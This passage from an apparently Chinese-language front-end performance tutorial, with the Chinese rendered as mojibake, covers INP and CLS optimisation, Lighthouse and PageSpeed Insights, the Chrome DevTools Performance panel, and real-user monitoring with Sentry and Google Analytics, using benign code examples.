&#125;<br>    <span class="hljs-built_in">setTimeout</span>(processChunk, <span class="hljs-number">0</span>); <span class="hljs-comment">// è®©å‡ºä¸»çº¿ç¨‹</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) äº¤äº’ä¼˜å…ˆçº§è°ƒåº¦</p><p>å…³é”®äº¤äº’ä½¿ç”¨ scheduler.postTask() é«˜ä¼˜å…ˆçº§:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TaskController</span>(&#123; <span class="hljs-attr">priority</span>: <span class="hljs-string">&#x27;user-blocking&#x27;</span> &#125;);<br>scheduler.<span class="hljs-title function_">postTask</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleInput</span>(), &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br></code></pre></td></tr></table></figure><p>(3) å‡å°‘å‘ˆç°å»¶è¿Ÿ</p><ul><li>é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€ï¼ˆForced Synchronous Layoutï¼‰</li><li>ä½¿ç”¨ CSS content-visibility: auto è·³è¿‡ç¦»å±æ¸²æŸ“</li></ul><p><strong>INP æµ‹é‡æ–¹æ³•</strong></p><ul><li>Chrome DevTools â†’ Performance é¢æ¿ï¼ˆæŸ¥çœ‹ Interaction to Next Paint æ—¶é—´çº¿ï¼‰<ul><li>çº¢è‰²ä¸‰è§’ï¼šäº¤äº’å¼€å§‹</li><li>è“è‰²ä¸‰è§’ï¼šä¸‹æ¬¡ç»˜åˆ¶å®Œæˆ</li></ul></li></ul><h3 id="CLS-ç´¯ç§¯å¸ƒå±€åç§»"><a href="#CLS-ç´¯ç§¯å¸ƒå±€åç§»" class="headerlink" title="CLS (ç´¯ç§¯å¸ƒå±€åç§»)"></a>CLS (ç´¯ç§¯å¸ƒå±€åç§»)</h3><p><strong>CLS æ ¸å¿ƒå®šä¹‰</strong></p><ul><li>å®˜æ–¹æ ‡å‡†<ul><li>æµ‹é‡é¡µé¢ç”Ÿå‘½å‘¨æœŸä¸­æ„å¤–å¸ƒå±€åç§»çš„ç´¯ç§¯åˆ†æ•°</li><li>é‡åŒ–è§†è§‰ç¨³å®šæ€§ï¼ˆé¿å…å…ƒç´ è·³åŠ¨å¯¼è‡´è¯¯æ“ä½œï¼‰</li></ul></li><li>è®¡ç®—è§„åˆ™<ul><li>CLS åˆ†æ•° &#x3D; å½±å“æ¯”ä¾‹ (impact fraction) Ã— è·ç¦»æ¯”ä¾‹ (distance fraction)</li><li>å½±å“æ¯”ä¾‹ï¼šåç§»å…ƒç´ åœ¨è§†å£å†…å æ®çš„é¢ç§¯ç™¾åˆ†æ¯”</li><li>è·ç¦»æ¯”ä¾‹ï¼šå…ƒç´ åç§»è·ç¦» &#x2F; è§†å£æœ€å¤§å°ºå¯¸ï¼ˆå–å®½æˆ–é«˜ä¸­è¾ƒå¤§å€¼ï¼‰</li></ul></li><li>æ€§èƒ½é˜ˆå€¼<ul><li>Goodï¼ˆä¼˜ï¼‰ï¼šâ‰¤ 0.1</li><li>Needs Improvementï¼ˆéœ€ä¼˜åŒ–ï¼‰ï¼š0.1 - 0.25</li><li>Poorï¼ˆå·®ï¼‰ï¼š&gt; 0.25</li></ul></li></ul><p><strong>å¸ƒå±€åç§»çš„è§¦å‘æ¡ä»¶</strong></p><ul><li>å¿…è¦æ¡ä»¶<ul><li>å…ƒç´ åœ¨ä¸¤ä¸ªè¿ç»­å¸§é—´å‘ç”Ÿä½ç½®å˜åŒ–</li><li>å˜åŒ–åŸå› éç”¨æˆ·ä¸»åŠ¨è§¦å‘ï¼ˆå¦‚ç‚¹å‡»ã€æ»šåŠ¨ï¼‰</li></ul></li><li>å¸¸è§åœºæ™¯ï¼š</li></ul><table><thead><tr><th align="left">ç±»å‹</th><th align="left">å…¸å‹æ¡ˆä¾‹</th></tr></thead><tbody><tr><td align="left">æœªå®šä¹‰å°ºå¯¸å…ƒç´ </td><td align="left"><code>&lt;img&gt;/&lt;video&gt;</code> æœªè®¾ width&#x2F;height</td></tr><tr><td align="left">åŠ¨æ€æ’å…¥å†…å®¹</td><td align="left">å¹¿å‘Šä½&#x2F;é€šçŸ¥æ¨ªå¹…å¼‚æ­¥åŠ è½½</td></tr><tr><td align="left">å­—ä½“åŠ è½½æŠ–åŠ¨</td><td align="left">FOIT&#x2F;FOUTï¼ˆå­—ä½“æ›¿æ¢å¯¼è‡´æ–‡æœ¬é‡æ’ï¼‰</td></tr><tr><td align="left">å¼‚æ­¥æ›´æ–° DOM</td><td align="left">æ— é™æ»šåŠ¨åˆ—è¡¨åŠ è½½æ–°é¡¹</td></tr></tbody></table><p><strong>CLS ä¼˜åŒ–å®è·µ</strong></p><p>(1) åª’ä½“å…ƒç´ é¢„ç•™ç©ºé—´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- æŒ‡å®šå®½é«˜æ¯”å®¹å™¨é˜²æ­¢å›¾ç‰‡åŠ è½½åæŠ–åŠ¨ --&gt;<br>&lt;div style=&quot;position: relative; padding-top: 56.25%&quot;&gt; &lt;!-- 16:9 --&gt;<br>  &lt;img src=&quot;banner.jpg&quot; alt=&quot;Banner&quot; <br>       style=&quot;position: absolute; top: 0; left: 0; width: 100%; height: 100%&quot;&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€å†…å®¹éš”ç¦»ç­–ç•¥</p><ul><li>ä¸ºåŠ¨æ€æ’å…¥å…ƒç´ é¢„ç•™å ä½å®¹å™¨</li><li>ä½¿ç”¨ CSS transform æ›¿ä»£å½±å“å¸ƒå±€çš„å±æ€§ï¼ˆé¿å…è§¦å‘é‡æ’ï¼‰</li></ul><p>(3) å­—ä½“åŠ è½½æ§åˆ¶</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* å¼ºåˆ¶ä½¿ç”¨å¤‡ç”¨å­—ä½“ç›´è‡³è‡ªå®šä¹‰å­—ä½“åŠ è½½ */</span><br><span class="hljs-keyword">@font-face</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;CustomFont&#x27;</span>;<br>  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;font.woff2&#x27;</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;woff2&#x27;</span>);<br>  <span class="hljs-attribute">font-display</span>: swap; <span class="hljs-comment">/* å…³é”®é€‰é¡¹ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(4) å¸ƒå±€ç¨³å®šæ€§ API</p><ul><li>ä½¿ç”¨ CSS aspect-ratio å®šä¹‰å®½é«˜æ¯”</li><li>ä¼˜å…ˆé‡‡ç”¨ Flexbox&#x2F;Grid å¸ƒå±€ï¼ˆå‡å°‘æµ®åŠ¨åç§»</li></ul><p><strong>CLS æµ‹é‡æ–¹æ³•</strong></p><ul><li>Chrome DevTools â†’ Performance é¢æ¿ï¼ˆæŸ¥çœ‹ Layout Shift è½¨è¿¹ï¼‰</li></ul><p><strong>å¸¸è§è¯¯åŒº</strong></p><ul><li>é”™è¯¯è®¤çŸ¥<ul><li>âŒ æ‰€æœ‰å…ƒç´ åç§»éƒ½è®¡å…¥ â†’ âœ… ä»…æ„å¤–åç§»ï¼ˆç”¨æˆ·è§¦å‘åç§»ä¸è®¡ï¼‰</li><li>âŒ CLS åªå…³æ³¨é¦–å± â†’ âœ… è¦†ç›–é¡µé¢å®Œæ•´ç”Ÿå‘½å‘¨æœŸ</li></ul></li><li>å®è·µé™·é˜±<ul><li>ä½¿ç”¨ position: fixed çš„å¤´éƒ¨å¯¼èˆªæ è‹¥åŠ¨æ€æ”¹å˜é«˜åº¦ï¼ˆå¦‚ç™»å½•æ¡å‡ºç°ï¼‰å°†å¯¼è‡´ä¸‹æ–¹å†…å®¹é›†ä½“åç§»</li><li>æ‡’åŠ è½½å›¾ç‰‡æœªè®¾ç½® width&#x2F;height æ—¶ï¼Œæ»šåŠ¨åŠ è½½ä¼šè§¦å‘è¿é”å¸ƒå±€é‡æ’</li></ul></li></ul><h2 id="1-2-æ€§èƒ½ç›‘æ§å·¥å…·"><a href="#1-2-æ€§èƒ½ç›‘æ§å·¥å…·" class="headerlink" title="1.2 æ€§èƒ½ç›‘æ§å·¥å…·"></a>1.2 æ€§èƒ½ç›‘æ§å·¥å…·</h2><h3 id="Lighthouse-PageSpeed-Insights"><a href="#Lighthouse-PageSpeed-Insights" class="headerlink" title="Lighthouse &#x2F; PageSpeed Insights"></a>Lighthouse &#x2F; PageSpeed Insights</h3><p><strong>æ ¸å¿ƒå®šä½ä¸å·®å¼‚</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Lighthouse</th><th align="left">PageSpeed Insights (PSI)</th></tr></thead><tbody><tr><td align="left">è¿è¡Œç¯å¢ƒ</td><td align="left">æœ¬åœ°ï¼ˆNode.js&#x2F;DevToolsï¼‰</td><td align="left">GoogleæœåŠ¡å™¨ï¼ˆäº‘ç«¯æµ‹è¯•ï¼‰</td></tr><tr><td align="left">æµ‹è¯•è®¾å¤‡æ¨¡æ‹Ÿ</td><td align="left">å¯è‡ªå®šä¹‰è®¾å¤‡&#x2F;ç½‘ç»œå‚æ•°</td><td align="left">å›ºå®šç§»åŠ¨ç«¯+æ¡Œé¢ç«¯ï¼ˆä¸å¯è°ƒå‚æ•°ï¼‰</td></tr><tr><td align="left">æ•°æ®æº</td><td align="left">å®éªŒå®¤æ•°æ®ï¼ˆLab Dataï¼‰</td><td align="left">å®éªŒå®¤æ•°æ® + éƒ¨åˆ†çœŸå®ç”¨æˆ·æ•°æ®ï¼ˆCrUXï¼‰</td></tr><tr><td align="left">æŠ¥å‘Šæ·±åº¦</td><td align="left">åŸå§‹è·Ÿè¸ªæ•°æ®å¯æ·±åº¦åˆ†æ</td><td align="left">èšåˆç»“æœï¼ˆæ— Performanceé¢æ¿çº§ç»†ç²’åº¦æ•°æ®ï¼‰</td></tr></tbody></table><p><strong>æ ¸å¿ƒåŠŸèƒ½è§£æ</strong></p><ul><li>æ€§èƒ½æŒ‡æ ‡æµ‹é‡<ul><li>ç›´æ¥è¾“å‡º Web Vitals ä¸‰é¡¹æŒ‡æ ‡ï¼ˆLCP, FID&#x2F;INP, CLSï¼‰</li><li>æä¾›æ€§èƒ½è¯„åˆ†ï¼ˆ0-100åˆ†ï¼‰åŠæ”¹è¿›å»ºè®®</li></ul></li><li>ä¼˜åŒ–å»ºè®®ç³»ç»Ÿ<ul><li>æŒ‰ä¼˜å…ˆçº§åˆ—å‡ºå¯ä¼˜åŒ–é¡¹ï¼ˆé«˜&#x2F;ä¸­&#x2F;ä½å½±å“ï¼‰</li><li>é™„å¸¦å¯æ“ä½œä»£ç ç¤ºä¾‹ï¼ˆå¦‚æœªå‹ç¼©å›¾ç‰‡åˆ—è¡¨ï¼‰</li></ul></li><li>æŠ€æœ¯æ ˆåˆ†æ<ul><li>è‡ªåŠ¨æ£€æµ‹æ¡†æ¶ï¼ˆReact&#x2F;Vueç­‰ï¼‰</li><li>è¯†åˆ«ç¬¬ä¸‰æ–¹è„šæœ¬å½±å“ï¼ˆå¹¿å‘Š&#x2F;åˆ†æå·¥å…·ï¼‰</li></ul></li></ul><p><strong>Lighthouse é«˜é˜¶ç”¨æ³•</strong></p><p>(1) Node CLI è‡ªå®šä¹‰æµ‹è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lighthouse https://example.com --output=json --emulated-form-factor=mobile --throttling.cpuSlowdownMultiplier=4<br></code></pre></td></tr></table></figure><ul><li>â€“presetï¼ˆæ€§èƒ½é¢„è®¾ï¼šperf|desktopï¼‰</li><li>â€“throttlingï¼ˆè‡ªå®šä¹‰ç½‘ç»œ&#x2F;CPUé™æµï¼‰</li><li>â€“only-categoriesï¼ˆæŒ‡å®šæµ‹è¯•ç±»ç›®ï¼šperformance|accessibilityï¼‰</li></ul><p>(2) DevTools æ·±åº¦åˆ†æ</p><ul><li>æŸ¥çœ‹ Performance é¢æ¿åŸå§‹è·Ÿè¸ªï¼ˆMainä¸»çº¿ç¨‹ç«ç„°å›¾ï¼‰</li><li>Coverage æ ‡ç­¾é¡µå®šä½æœªä½¿ç”¨JS&#x2F;CSSï¼ˆçº¢æ¡æ ‡è®°å¯åˆ ä»£ç ï¼‰</li></ul><p><strong>æŠ¥å‘Šè§£è¯»æŠ€å·§</strong></p><p>(1) å…³é”®æŒ‡æ ‡ä¼˜å…ˆçº§</p><pre class="mermaid">graph TDA[æ€§èƒ½è¯„åˆ†] --> B[Web Vitals]B --> B1(LCP)B --> B2(FID/INP)B --> B3(CLS)A --> C[ä¼˜åŒ–å»ºè®®]C --> C1(Opportunities)C --> C2(Diagnostics)</pre><p>(2) æ ¸å¿ƒä¼˜åŒ–å»ºè®®åˆ†ç±»</p><table><thead><tr><th align="left">ç±»åˆ«</th><th align="left">å…¸å‹æ¡ˆä¾‹</th><th align="left">ä¿®å¤æ”¶ç›Š</th></tr></thead><tbody><tr><td align="left">Opportunities</td><td align="left">ç§»é™¤æœªç”¨CSS&#x2F;å›¾ç‰‡å‹ç¼©</td><td align="left">â˜…â˜…â˜…</td></tr><tr><td align="left">Diagnostics</td><td align="left">æœ€å°åŒ–ä¸»çº¿ç¨‹å·¥ä½œ&#x2F;é¿å…DOMè¿‡å¤§</td><td align="left">â˜…â˜…</td></tr><tr><td align="left">Passed Audits</td><td align="left">å·²ä¼˜åŒ–çš„æœ€ä½³å®è·µ</td><td align="left">-</td></tr></tbody></table><h3 id="Chrome-DevTools-Performanceé¢æ¿æ·±åº¦ä½¿ç”¨"><a href="#Chrome-DevTools-Performanceé¢æ¿æ·±åº¦ä½¿ç”¨" class="headerlink" title="Chrome DevTools Performanceé¢æ¿æ·±åº¦ä½¿ç”¨"></a>Chrome DevTools Performanceé¢æ¿æ·±åº¦ä½¿ç”¨</h3><p><strong>æ ¸å¿ƒåŠŸèƒ½å®šä½</strong></p><ul><li>æ ¸å¿ƒä»·å€¼<ul><li>å¯è§†åŒ–åˆ†æé¡µé¢è¿è¡Œæ—¶æ€§èƒ½ç“¶é¢ˆï¼ˆéåŠ è½½é˜¶æ®µï¼‰</li><li>æä¾›æ¯«ç§’çº§ä¸»çº¿ç¨‹æ´»åŠ¨è¿½è¸ªï¼ˆJSæ‰§è¡Œ&#x2F;æ¸²æŸ“&#x2F;ç½‘ç»œï¼‰</li></ul></li><li>ä¸Lighthouseå·®å¼‚ï¼š</li></ul><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Performance é¢æ¿</th><th align="left">Lighthouse</th></tr></thead><tbody><tr><td align="left">åˆ†æç±»å‹</td><td align="left">è¿è¡Œæ—¶åŠ¨æ€è¿½è¸ª</td><td align="left">é™æ€è§„åˆ™å®¡è®¡</td></tr><tr><td align="left">æ•°æ®ç²’åº¦</td><td align="left">æ¯«ç§’çº§å‡½æ•°è°ƒç”¨æ ˆ</td><td align="left">èšåˆæŒ‡æ ‡è¯„åˆ†</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">è¯Šæ–­å¡é¡¿&#x2F;å†…å­˜æ³„æ¼</td><td align="left">æ•´ä½“ä¼˜åŒ–å»ºè®®</td></tr></tbody></table><p><strong>æ“ä½œå…¨æµç¨‹è§£æ</strong></p><ul><li>å½•åˆ¶å‡†å¤‡<ul><li>å¼€å¯ Screenshotsï¼ˆå¸§æˆªå›¾ï¼‰æ•æ‰è§†è§‰å˜åŒ–</li><li>å¯ç”¨ Advanced settings â†’ Web Vitals æ ‡è®°å…³é”®æŒ‡æ ‡</li></ul></li></ul><pre class="mermaid">graph LRA[ç‚¹å‡»Recordå¼€å§‹å½•åˆ¶] --> B[æ‰§è¡Œç”¨æˆ·æ“ä½œ]B --> C[åœæ­¢å½•åˆ¶]C --> D[åˆ†æç«ç„°å›¾]</pre><ul><li>å…³é”®æ§åˆ¶é¡¹<ul><li>CPU Throttlingï¼šæ¨¡æ‹Ÿç§»åŠ¨ç«¯CPUï¼ˆæ¨è4xé™é€Ÿï¼‰</li><li>Network Throttlingï¼šæ¨¡æ‹Ÿæ…¢ç½‘ç»œï¼ˆæ¨èFast 3Gï¼‰</li><li>Enable advanced paint instrumentationï¼šåˆ†æå›¾å±‚ç»˜åˆ¶</li></ul></li></ul><p><strong>æŠ¥å‘Šç»“æ„æ·±åº¦è§£è¯»</strong></p><p>(1) æ—¶é—´çº¿æ¦‚è§ˆï¼ˆOverviewï¼‰</p><table><thead><tr><th align="left">åŒºåŸŸ</th><th align="left">åˆ†æç»´åº¦</th><th align="left">å…³é”®ä¿¡æ¯</th></tr></thead><tbody><tr><td align="left">FPS</td><td align="left">å¸§ç‡æ³¢åŠ¨</td><td align="left">çº¢è‰²å—&#x3D;æ‰å¸§ï¼ˆ&lt;50fpsï¼‰</td></tr><tr><td align="left">CPU</td><td align="left">å¤„ç†å™¨è´Ÿè½½åˆ†é…</td><td align="left">é¢œè‰²&#x3D;JS&#x2F;æ¸²æŸ“&#x2F;å…¶ä»–</td></tr><tr><td align="left">NET</td><td align="left">ç½‘ç»œè¯·æ±‚ç€‘å¸ƒæµ</td><td align="left">æ¡å½¢é•¿åº¦&#x3D;è¯·æ±‚è€—æ—¶</td></tr></tbody></table><p>(2) ä¸»ç¨‹ç«ç„°å›¾</p><ul><li>æ¨ªå‘ï¼šæ—¶é—´è½´ï¼ˆæ¯«ç§’çº§ï¼‰</li><li>çºµå‘ï¼šè°ƒç”¨æ ˆæ·±åº¦ï¼ˆå‡½æ•°åµŒå¥—å…³ç³»ï¼‰</li><li>å…³é”®æ ‡è¯†ï¼š<ul><li>çº¢è‰²ä¸‰è§’ï¼šé•¿ä»»åŠ¡ï¼ˆ&gt;50msï¼‰</li><li>é»„è‰²å—ï¼šJavaScriptæ‰§è¡Œ</li><li>ç´«è‰²å—ï¼šå¸ƒå±€è®¡ç®—ï¼ˆLayoutï¼‰</li></ul></li></ul><p><strong>æ€§èƒ½ç“¶é¢ˆè¯Šæ–­æŠ€å·§</strong></p><ul><li>é•¿ä»»åŠ¡æº¯æº<ul><li>å±•å¼€ç«ç„°å›¾ä¸­è¶…è¿‡50msçš„ä»»åŠ¡å—</li><li>å®šä½è€—æ—¶æœ€é•¿çš„å‡½æ•°è°ƒç”¨ï¼ˆåº•éƒ¨æœ€æ·±è‰²å—ï¼‰</li></ul></li><li>å¸ƒå±€æŠ–åŠ¨åˆ†æ<ul><li>æŸ¥æ‰¾è¿ç»­å‡ºç°çš„ Layout ç´«è‰²å—</li><li>æ£€æŸ¥è§¦å‘æºï¼ˆé€šå¸¸ç”±JSå¼ºåˆ¶åŒæ­¥å¸ƒå±€å¯¼è‡´ï¼‰ï¼š</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åä¾‹ï¼šè§¦å‘å¼ºåˆ¶å¸ƒå±€</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// è¯»å–</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// å†™å…¥</span><br><span class="hljs-keyword">const</span> newWidth = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// å†æ¬¡è¯»å– â†’ å¸ƒå±€æŠ–åŠ¨ï¼</span><br></code></pre></td></tr></table></figure><ul><li>æ¸²æŸ“å±‚ä¼˜åŒ–ï¼šåˆ‡æ¢ Layers æ ‡ç­¾é¡µï¼š<ul><li>æ£€æŸ¥å›¾å±‚æ•°é‡ï¼ˆè¿‡å¤š&#x3D;å†…å­˜å ç”¨é«˜ï¼‰</li><li>å®šä½ Repaint é«˜é¢‘åŒºåŸŸï¼ˆçº¢è‰²é«˜äº®ï¼‰</li></ul></li></ul><p><strong>é«˜çº§åŠŸèƒ½åº”ç”¨</strong></p><ul><li>æ€§èƒ½ç›‘æ§ç‚¹ï¼ˆPerformance Monitorï¼‰<ul><li>å®æ—¶è·Ÿè¸ªå…³é”®æŒ‡æ ‡ï¼š<ul><li>JSå †å†…å­˜å¤§å°</li><li>DOMèŠ‚ç‚¹æ•°é‡</li><li>äº‹ä»¶ç›‘å¬å™¨æ•°é‡</li></ul></li><li>è¯Šæ–­å†…å­˜æ³„æ¼ï¼šå†…å­˜æ›²çº¿æŒç»­ä¸Šå‡</li></ul></li><li>æ¸²æŸ“åˆ†æï¼ˆRenderingï¼‰<ul><li>å¯ç”¨ Paint flashingï¼šç»¿è‰²é—ªçƒ&#x3D;é‡ç»˜åŒºåŸŸ</li><li>å¼€å¯ Layout Shift Regionsï¼šè“è‰²è¦†ç›–&#x3D;å¸ƒå±€åç§»åŒºåŸŸ</li></ul></li><li>ä»£ç çº§ä¼˜åŒ–å®šä½<ul><li>å³å‡»ç«ç„°å›¾å— â†’ Reveal in Source panel</li><li>æŸ¥çœ‹å‡½æ•°æºç åŠæ‰§è¡Œè€—æ—¶ï¼ˆç²¾ç¡®åˆ°è¡Œï¼‰</li></ul></li></ul><p><strong>å®æˆ˜è°ƒè¯•æ¡ˆä¾‹</strong></p><p>åœºæ™¯ï¼šæŒ‰é’®ç‚¹å‡»å¡é¡¿</p><ul><li>å½•åˆ¶ç‚¹å‡»æ“ä½œ</li><li>åˆ†æç«ç„°å›¾ï¼š<ul><li>å‘ç° Event: click ä¸‹200msé•¿ä»»åŠ¡</li><li>å±•å¼€å®šä½åˆ° processData() å‡½æ•°è€—æ—¶180ms</li></ul></li><li>ä¼˜åŒ–æ–¹æ¡ˆï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜åŒ–å‰ï¼ˆåŒæ­¥é˜»å¡ï¼‰</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">processData</span>(); <span class="hljs-comment">// 200msä»»åŠ¡</span><br>&#125;);<br><br><span class="hljs-comment">// ä¼˜åŒ–åï¼ˆä»»åŠ¡æ‹†åˆ†ï¼‰</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(processData, <span class="hljs-number">0</span>); <span class="hljs-comment">// æ‹†è§£ä»»åŠ¡</span><br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="RUM-Real-User-Monitoring-æ–¹æ¡ˆï¼šSentry-Google-Analytics"><a href="#RUM-Real-User-Monitoring-æ–¹æ¡ˆï¼šSentry-Google-Analytics" class="headerlink" title="RUM (Real User Monitoring) æ–¹æ¡ˆï¼šSentry &#x2F; Google Analytics"></a>RUM (Real User Monitoring) æ–¹æ¡ˆï¼šSentry &#x2F; Google Analytics</h3><p><strong>RUM æ ¸å¿ƒå®šä¹‰ä¸ä»·å€¼</strong></p><ul><li>åŸºæœ¬æ¦‚å¿µ<ul><li>RUM é€šè¿‡åµŒå…¥å‰ç«¯ä»£ç ï¼ˆå¦‚ JavaScript SDKï¼‰æ”¶é›†çœŸå®ç”¨æˆ·è®¿é—®æ—¶çš„æ€§èƒ½æ•°æ®ã€äº¤äº’è¡Œä¸ºåŠé”™è¯¯ä¿¡æ¯ã€‚</li><li>ä¸åˆæˆç›‘æ§ï¼ˆSynthetic Monitoringï¼‰çš„åŒºåˆ«ï¼šçœŸå®ç”¨æˆ·æ•°æ®ï¼ˆéæ¨¡æ‹Ÿç¯å¢ƒï¼‰è¦†ç›–å¤šè®¾å¤‡ã€å¤šç½‘ç»œæ¡ä»¶åœºæ™¯ã€‚</li></ul></li><li>æ ¸å¿ƒä»·å€¼<ul><li>æ€§èƒ½ä¼˜åŒ–ï¼šå®šä½çœŸå®ç¯å¢ƒä¸­çš„æ€§èƒ½ç“¶é¢ˆï¼ˆå¦‚æ…¢åŠ è½½ã€é«˜å»¶è¿Ÿï¼‰ã€‚</li><li>é”™è¯¯è¯Šæ–­ï¼šæ•è·ç”Ÿäº§ç¯å¢ƒä¸­çš„ JavaScript é”™è¯¯åŠèµ„æºåŠ è½½å¤±è´¥ã€‚</li><li>è¡Œä¸ºåˆ†æï¼šè¿½è¸ªç”¨æˆ·ç‚¹å‡»è·¯å¾„ã€é¡µé¢åœç•™æ—¶é•¿ï¼Œå…³è”ä¸šåŠ¡è½¬åŒ–ç‡</li></ul></li></ul><p><strong>Sentryï¼šæ·±åº¦é”™è¯¯è¯Šæ–­æ–¹æ¡ˆ</strong></p><p>æ ¸å¿ƒåŠŸèƒ½ï¼š</p><table><thead><tr><th align="left">åŠŸèƒ½ç±»åˆ«</th><th align="left">å…·ä½“èƒ½åŠ›</th></tr></thead><tbody><tr><td align="left">é”™è¯¯è¿½è¸ª</td><td align="left">- è‡ªåŠ¨æ•è·æœªå¤„ç†çš„ JavaScript å¼‚å¸¸ã€Promise æ‹’ç»ã€èµ„æºåŠ è½½å¤±è´¥ <br> - æ”¯æŒæºç æ˜ å°„ï¼ˆSourcemapï¼‰å®šä½å‹ç¼©ä»£ç çš„é”™è¯¯è¡Œ</td></tr><tr><td align="left">ä¼šè¯é‡æ”¾</td><td align="left">å½•åˆ¶ç”¨æˆ·æ“ä½œåºåˆ—ï¼Œé‡ç°é”™è¯¯å‘ç”Ÿå‰çš„è¡Œä¸ºè·¯å¾„ï¼ˆéœ€ä»˜è´¹ç‰ˆï¼‰</td></tr><tr><td align="left">æ€§èƒ½ç›‘æ§</td><td align="left">- æµ‹é‡é¡µé¢åŠ è½½æ—¶é—´ã€API è¯·æ±‚å»¶è¿Ÿ<br> - å…³è”é”™è¯¯ä¸æ€§èƒ½æ…¢è¯·æ±‚ï¼ˆå¦‚é«˜å»¶è¿Ÿè§¦å‘çš„è¶…æ—¶é”™è¯¯ï¼‰</td></tr><tr><td align="left">è‡ªå®šä¹‰ä¸Šä¸‹æ–‡</td><td align="left">æ·»åŠ ç”¨æˆ·ä¿¡æ¯ã€ç¯å¢ƒå˜é‡ç­‰è¾…åŠ©è¯Šæ–­çš„æ ‡ç­¾ï¼ˆå¦‚ user.idã€release.versionï¼‰</td></tr></tbody></table><p>å®æ–½ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Sentry åˆå§‹åŒ–ï¼ˆWeb SDKï¼‰</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;@sentry/browser&quot;</span>;<br><span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>(&#123;<br>  <span class="hljs-attr">dsn</span>: <span class="hljs-string">&quot;https://example@sentry.io/123&quot;</span>,<br>  <span class="hljs-attr">release</span>: <span class="hljs-string">&quot;my-app@1.0.0&quot;</span>,<br>  <span class="hljs-attr">integrations</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sentry</span>.<span class="hljs-title class_">BrowserTracing</span>()],<br>  <span class="hljs-attr">tracesSampleRate</span>: <span class="hljs-number">0.2</span>, <span class="hljs-comment">// æ€§èƒ½æ•°æ®é‡‡æ ·ç‡</span><br>&#125;);<br><br><span class="hljs-comment">// æ‰‹åŠ¨æ•è·é”™è¯¯</span><br><span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureException</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Custom error&quot;</span>));<br></code></pre></td></tr></table></figure><p><strong>Google Analyticsï¼šè¡Œä¸ºä¸æ€§èƒ½åˆ†ææ–¹æ¡ˆ</strong></p><p>æ ¸å¿ƒåŠŸèƒ½ï¼š</p><table><thead><tr><th align="left">åŠŸèƒ½ç±»åˆ«</th><th align="left">å…·ä½“èƒ½åŠ›</th></tr></thead><tbody><tr><td align="left">ç”¨æˆ·è¡Œä¸ºåˆ†æ</td><td align="left">- é¡µé¢æµè§ˆé‡ï¼ˆPVï¼‰ã€ä¼šè¯æ—¶é•¿ã€è·³å‡ºç‡ç»Ÿè®¡ <br> - äº‹ä»¶è·Ÿè¸ªï¼ˆç‚¹å‡»ã€è¡¨å•æäº¤ç­‰è‡ªå®šä¹‰äº‹ä»¶ï¼‰</td></tr><tr><td 